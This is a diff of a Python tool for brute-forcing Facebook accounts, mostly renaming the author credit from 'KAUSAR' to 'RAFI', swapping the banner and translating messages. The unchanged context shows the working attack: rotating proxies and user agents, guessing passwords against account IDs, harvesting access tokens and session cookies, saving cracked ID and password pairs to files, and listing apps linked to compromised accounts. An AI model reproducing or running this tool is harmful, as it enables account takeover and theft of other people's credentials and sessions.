@@ -1,7 +1,3 @@
-# Source Generated with Decompyle++
-# File: rexm.pyc (Python 3.10) RANI
-#https://youtube.com/channel/UCbT--Z1XzQpSUgjD6bfzzUA
-#-----------------[ IMPORT-MODULE ]-------------------
 from bs4 import BeautifulSoup as sop
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -42,7 +38,7 @@ try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox) 
 except Exception as e:
-	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Mr.KAUSAR]')
+	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Mr.RAFI]')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -139,7 +135,7 @@ else:
     a = ltx
     tag = "\x1b[1;96mAM"
 
-def _KAUSAR_(u):
+def _RAFI_(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
 def clear():
 	os.system('clear')
@@ -148,16 +144,20 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	print(f"""
-\x1b[1;91m{hh}██████  ██    ██ ██████  ██      ██  ██████ 
-\x1b[1;91m██   ██ ██    ██ ██   ██ ██      ██ ██      
-\x1b[1;91m██████  ██    ██ ██████  ██      ██ ██      
-\x1b[1;91m██      ██    ██ ██   ██ ██      ██ ██      
-\x1b[1;91m██       ██████  ██████  ███████ ██  ██████{P}
+{hh}  _____  _    _ ____  _      _____ _____ 
+ |  __ \| |  | |  _ \| |    |_   _/ ____|
+ | |__) | |  | | |_) | |      | || |     
+ |  ___/| |  | |  _ <| |      | || |     
+ | |    | |__| | |_) | |____ _| || |____ 
+ |_|     \____/|____/|______|_____\_____|{P}  
+  \033[1;92m  | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |
+ \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]""")
+
 os.system('clear')
 banner()
-os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_MR_RAFI_WORLD.mp3")
+
 print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;31mWhat Is Your Name\033[40m\033[00m')
-KAUSAR_NAME=input(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Your Name ➣\x1b[1;96m ')
+RAFI_NAME=input(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Your Name ➣\x1b[1;96m ')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -188,7 +188,7 @@ def login_lagi334():
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython KAUSAR.py');time.sleep(1)
+		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Login Successful \n \x1b[1;91m\x1b[1;96m\x1b[1;92m Type \x1b[1;96mpython PUBLIC.py');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -207,36 +207,36 @@ def menu(my_name,my_id):
 	os.system('clear')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	_KAUSAR_(f'\x1b[1;91m┏────────────────────────┓')
-	_KAUSAR_(f'\x1b[1;91m│\033[47m\033[1;30mPREMIUM USER INFORMATION\033[40m\033[00m\x1b[1;91m│')
-	_KAUSAR_(f'\x1b[1;91m┠─────────────┯──────────┛')
-	_KAUSAR_(f'\x1b[1;91m│\x1b[1;92mYour Name\x1b[1;91m────╂➣\x1b[1;92m '+str(KAUSAR_NAME))
-	_KAUSAR_(f'\x1b[1;91m│\x1b[1;92mYour ID Name\x1b[1;91m─╂➣\x1b[1;92m {my_name}')
-	_KAUSAR_(f'\x1b[1;91m│\x1b[1;92mCloning Date\x1b[1;91m─╂➣ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')
-	_KAUSAR_(f"\x1b[1;91m│\x1b[1;92mCloning Time\x1b[1;91m─╂➣ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
-	_KAUSAR_(f'\x1b[1;91m│\x1b[1;92mYour ID\x1b[1;91m──────╂➣\x1b[1;92m '+str(my_id))
-	_KAUSAR_(f'\x1b[1;91m│\x1b[1;92mYour IP\x1b[1;91m──────╂➣ \x1b[1;92m{ip}')
-	_KAUSAR_(f'\x1b[1;91m┗─────────────┛')
-	_KAUSAR_(f'\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m  CRACK METHOD  \033[40m\033[00m')
-	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
-	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m PUBLIC CRACK')
-	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m RANDOM CRACK')
-	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m CONTACT ME')
-	_KAUSAR_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m LOGOUT COOKIE & EXIT')
-	_____KAUSAR_____ = input('\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣\x1b[1;92m ')
-	if _____KAUSAR_____ in ['1']:
+	_RAFI_(f'\x1b[1;91m┏────────────────────────┓')
+	_RAFI_(f'\x1b[1;91m│\033[47m\033[1;30m{hh}PREMIUM USER INFORMATION{P}\033[40m\033[00m\x1b[1;91m│')
+	_RAFI_(f'\x1b[1;91m┠─────────────┯──────────┛')
+	_RAFI_(f'\x1b[1;91m│\x1b[1;92mYour Name\x1b[1;91m────╂➣\x1b[1;92m '+str(RAFI_NAME))
+	_RAFI_(f'\x1b[1;91m│\x1b[1;92mYour ID Name\x1b[1;91m─╂➣\x1b[1;92m {my_name}')
+	_RAFI_(f'\x1b[1;91m│\x1b[1;92mCloning Date\x1b[1;91m─╂➣ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')
+	_RAFI_(f"\x1b[1;91m│\x1b[1;92mCloning Time\x1b[1;91m─╂➣ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+	_RAFI_(f'\x1b[1;91m│\x1b[1;92mYour ID\x1b[1;91m──────╂➣\x1b[1;92m '+str(my_id))
+	_RAFI_(f'\x1b[1;91m│\x1b[1;92mYour IP\x1b[1;91m──────╂➣ \x1b[1;92m{ip}')
+	_RAFI_(f'\x1b[1;91m┗─────────────┛')
+	_RAFI_(f'\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m  CRACK METHOD  \033[40m\033[00m')
+	_RAFI_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
+	_RAFI_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m PUBLIC CRACK')
+	_RAFI_(f'\x1b[1;91m[\x1b[1;92m3\x1b[1;91m]\x1b[1;92m RANDOM CRACK')
+	_RAFI_(f'\x1b[1;91m[\x1b[1;92m4\x1b[1;91m]\x1b[1;92m CONTACT ME')
+	_RAFI_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m LOGOUT COOKIE & EXIT')
+	_____RAFI_____ = input('\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoice ➣\x1b[1;92m ')
+	if _____RAFI_____ in ['1']:
 		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
 		F()
-	if _____KAUSAR_____ in ['2']:
+	if _____RAFI_____ in ['2']:
 		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
 		P()
-	if _____KAUSAR_____ in ['3']:
+	if _____RAFI_____ in ['3']:
 		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
-		os.system('python PC.py')
-	if _____KAUSAR_____ in ['4']:
+		os.system('python PUBLIC.py')
+	if _____RAFI_____ in ['4']:
 		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
 		os.system("xdg-open https://www.facebook.com/zihad.hossain36")
-	if _____KAUSAR_____ in ['0']:
+	if _____RAFI_____ in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LogOut Successful ')
@@ -364,7 +364,7 @@ def Settings():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option Bro')
+		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Option Bara')
 		exit()
 	
 	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m Mobile [BEST]')
@@ -387,7 +387,7 @@ def Settings():
 	exit() 
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mᴍʀ.ᴋᴀᴜsᴀʀ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
+	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMR.RAFI\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
 	print(f"\x1b[1;91m [😍] \x1b[1;92mYour Name         \x1b[1;91m➢ \x1b[1;92m"+str(KAUSAR_NAME))
 	print(f"\x1b[1;91m [🚀] \x1b[1;92mTOTAL ID          \x1b[1;91m➢ \x1b[1;92m"+str(len(id)))
 	print(f"\x1b[1;91m [💉] \x1b[1;92mTODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
@@ -447,7 +447,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo} MR.RAFI {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
+	sys.stdout.write(f"\r{bo} MR.KAUSAR {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{'{:.0%}'.format(loop/float(len(id)))}]  "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -474,7 +474,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{H}\n MR-RAFI_OK [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}\n [🚀]USER AGENT ➢ {ua}{N}')
+				print(f'\r{H}\n Mr.RAFI_OK [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}\n [🚀]USER AGENT ➢ {ua}{N}')
 				os.system("play-audio Mr_RAFI_OK.mp3")
 				cek_apk(session,coki)
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
@@ -562,7 +562,7 @@ def cek_opsi():
 			elif "c_user" in ses.cookies.get_dict().keys():
 				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
 			else:
-				print('\r%s++++ %s|%s ----> WRONG       %s'%(x,id,pw,x))
+				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
 			love+=1
 		except requests.exceptions.ConnectionError:
 			print('')
@@ -579,7 +579,7 @@ def cek_apk(session,cookie):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] OPSS THERE ARE NO EXPIRED APPLICATIONS IN THIS ACCOUNT.")
+		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
 	else:
 		for i in range(len(game)):
 			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
@@ -588,7 +588,7 @@ def cek_apk(session,cookie):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] OPSS THERE ARE NO EXPIRED APPLICATIONS IN THIS ACCOUNT.")
+		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
 	else:
 		for i in range(len(game)):
 			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
